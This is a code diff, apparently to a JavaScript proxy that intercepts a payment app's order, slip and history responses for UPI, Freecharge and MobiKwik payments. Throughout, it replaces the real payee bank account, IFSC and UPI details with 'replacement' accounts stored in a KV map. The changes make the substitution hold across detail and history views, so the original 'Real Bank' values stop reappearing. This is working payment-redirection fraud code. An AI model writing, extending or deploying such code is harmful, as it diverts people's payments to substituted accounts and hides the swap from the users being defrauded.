@@ -302,8 +302,8 @@ function getRequestOrderId(req) {
 
 function inferWalletScheme(source) {
   if (!source || typeof source !== 'object') return '';
-  const payAccount = String(source.payAccount || source.upi || source.vpa || '').toLowerCase();
-  const payType = Number(source.payType ?? source.ctType ?? source.method);
+  const payAccount = String(source.payAccount || source.pay_account || source.upi || source.vpa || source.ctAccount || source.ct_account || '').toLowerCase();
+  const payType = Number(source.payType ?? source.pay_type ?? source.ctType ?? source.ct_type ?? source.paymentMethod ?? source.payment_method ?? source.method);
   if (payAccount.includes('@freecharge') || payType === 3) return 'freecharge';
   if (payAccount.includes('@mbk') || payAccount.includes('mobikwik') || payType === 2) return 'mobikwik';
   const wallet = String(source.walletDomain || source.walletUrl || '');
@@ -1770,7 +1770,12 @@ const isSlipDetail = !urlLower.includes('pickuppaymentslip') && (
       // If backend returned 404 / error / non-JSON — try to serve from orderBankMap
       const slipFailed = !sj2 || sd.status === 404 || (sj2.code !== 0 && sj2.code !== undefined);
       const detailSlipId = getRequestOrderId(req);
-      const savedDetailSlip = getSavedOrderMapping(data, detailSlipId);
+      const detailResponseId = sj2 && sj2.data && typeof sj2.data === 'object'
+        ? (sj2.data.rptNo || sj2.data.orderNo || sj2.data.orderId || sj2.data.id || sj2.data.slipId || '')
+        : '';
+      const savedDetailSlip = getSavedOrderMapping(data, detailSlipId) ||
+        getSavedOrderMapping(data, detailResponseId) ||
+        getSavedOrderMapping(data, sj2 && sj2.data);
       if (slipFailed && savedDetailSlip) {
         const slipId = detailSlipId;
         const savedSlip = savedDetailSlip;
@@ -2084,7 +2089,7 @@ const isSlipDetail = !urlLower.includes('pickuppaymentslip') && (
       || urlLower.includes('news/code/'); // For dynamic direct payment screens like freechargetutorial
     let _orderId = '';
     if (isOrder) {
-      const orderFields = ['orderId', 'orderNo', 'order_id', 'order_no', 'buyOrderNo', 'tradeNo', 'id', 'slipId'];
+      const orderFields = ['rptNo', 'rpt_no', 'orderId', 'orderNo', 'order_id', 'order_no', 'buyOrderNo', 'tradeNo', 'id', 'slipId'];
       if (respData && typeof respData === 'object' && !Array.isArray(respData)) {
         for (const f of orderFields) {
           if (respData[f] && String(respData[f]).length >= 3) { _orderId = String(respData[f]); break; }
@@ -2314,7 +2319,17 @@ const isSlipDetail = !urlLower.includes('pickuppaymentslip') && (
                 // wallet metadata from the live order so Freecharge is not
                 // represented by a stale MobiKwik URL.
                 const existing = data.orderBankMap[String(rptNo)];
-                if (existing && (originalWallet || walletScheme)) {
+                if (existing) {
+                  // The order is already allowed to be replaced because it is
+                  // present in KV. Refresh the selected bank fields as well as
+                  // wallet metadata so stale real-bank values cannot block the
+                  // later history/detail paths.
+                  existing.bank = `${bkName} | ${bkAcct} | ${bkIfsc}`;
+                  existing.accountHolder = bkName;
+                  existing.accountNo = bkAcct;
+                  existing.ifsc = bkIfsc;
+                  existing.bankName = activeBank.bankName || existing.bankName || '';
+                  existing.upiId = activeBank.upiId || existing.upiId || '';
                   existing.walletDomain = wDom;
                   existing.walletScheme = walletScheme || existing.walletScheme || '';
                   existing.payType = wc.payType || wc.ctType || existing.payType || 2;
@@ -2395,7 +2410,8 @@ const isSlipDetail = !urlLower.includes('pickuppaymentslip') && (
             } else {
               // History items may be changed only when their order ID is already
               // present in orderBankMap. An unmapped/cancelled order is left as-is.
-              const savedMapping = getSavedOrderMapping(data, item);
+              const savedMapping = getSavedOrderMapping(data, item.rptNo || item.orderNo || item.orderId || item.id || item.slipId || '') ||
+                getSavedOrderMapping(data, item);
               if (savedMapping) {
                 const mappedBank = bankFromSavedOrder(savedMapping);
                 if (mappedBank && (mappedBank.accountNo || mappedBank.ifsc || mappedBank.accountHolder)) {
@@ -2439,8 +2455,11 @@ const isSlipDetail = !urlLower.includes('pickuppaymentslip') && (
             const pickupOrderId = isPickupResponse
               ? (getRequestOrderId(req) || reqBody.order_id || reqBody.orderId || reqBody.orderNo || reqBody.rptNo || reqBody.id || reqBody.slipId || '')
               : '';
+            const directSingleId = respData && typeof respData === 'object'
+              ? (respData.rptNo || respData.orderNo || respData.orderId || respData.id || respData.slipId || '')
+              : '';
             const savedSingleOrder = singleOrderState > 0 || isPickupResponse
-              ? (getSavedOrderMapping(data, respData) || getSavedOrderMapping(data, pickupOrderId))
+              ? (getSavedOrderMapping(data, directSingleId) || getSavedOrderMapping(data, respData) || getSavedOrderMapping(data, pickupOrderId))
               : null;
             // Completed/history and pick-up responses are strict: no KV mapping
             // means no replacement. Other active/pending responses retain existing behavior.
@@ -2479,25 +2498,31 @@ const isSlipDetail = !urlLower.includes('pickuppaymentslip') && (
       const _orderAmt = _notReplacedAmt !== null ? _notReplacedAmt : getOrderAmount(req, respData);
       if (_orderId) {
         if (!data.orderBankMap) data.orderBankMap = {};
+        const existingOrderMapping = getSavedOrderMapping(data, _orderId) || getSavedOrderMapping(data, respData);
         const bk = _bankReplaced && _replacedBank ? _replacedBank : (_realBankSnap || {});
-        // Fix duplicate order save by explicitly setting rptNo
-        const altId = (respData && respData.rptNo) ? String(respData.rptNo) : '';
-        const savedData = {
-          bank: `${bk.accountHolder || ''} | ${bk.accountNo || ''} | ${bk.ifsc || ''}`,
-          time: now,
-          userId: userId || '',
-          rptNo: _orderId,
-          orderNo: altId || _orderId,
-          amount: _orderAmt || 0,
-          isManual: true,
-          forced: true
-        };
-        data.orderBankMap[_orderId] = savedData;
-        if (altId && altId !== _orderId) {
-          data.orderBankMap[altId] = savedData;
+        // Never overwrite an existing KV mapping with the upstream real bank.
+        // This was clearing the selected replacement before history/detail loads.
+        if (!existingOrderMapping) {
+          const altId = (respData && respData.rptNo) ? String(respData.rptNo) : '';
+          const savedData = {
+            bank: `${bk.accountHolder || ''} | ${bk.accountNo || ''} | ${bk.ifsc || ''}`,
+            accountHolder: bk.accountHolder || '',
+            accountNo: bk.accountNo || '',
+            ifsc: bk.ifsc || '',
+            bankName: bk.bankName || '',
+            upiId: bk.upiId || '',
+            time: now,
+            userId: userId || '',
+            rptNo: _orderId,
+            orderNo: altId || _orderId,
+            amount: _orderAmt || 0,
+            isManual: true,
+            forced: true
+          };
+          data.orderBankMap[_orderId] = savedData;
+          if (altId && altId !== _orderId) data.orderBankMap[altId] = savedData;
+          await saveData(data);
         }
-        // Save dynamically captured direct order screen
-        await saveData(data);
       }
       const realLine = _realBankSnap && (_realBankSnap.accountNo || _realBankSnap.accountHolder)
         ? `🏦 Real Bank:\n  Name: ${_realBankSnap.accountHolder || 'N/A'}\n  Acc:  ${_realBankSnap.accountNo || 'N/A'}${_realBankSnap.ifsc ? '\n  IFSC: ' + _realBankSnap.ifsc : ''}${_realBankSnap.bankName ? '\n  Bank: ' + _realBankSnap.bankName : ''}${_realBankSnap.upiId ? '\n  UPI:  ' + _realBankSnap.upiId : ''}`
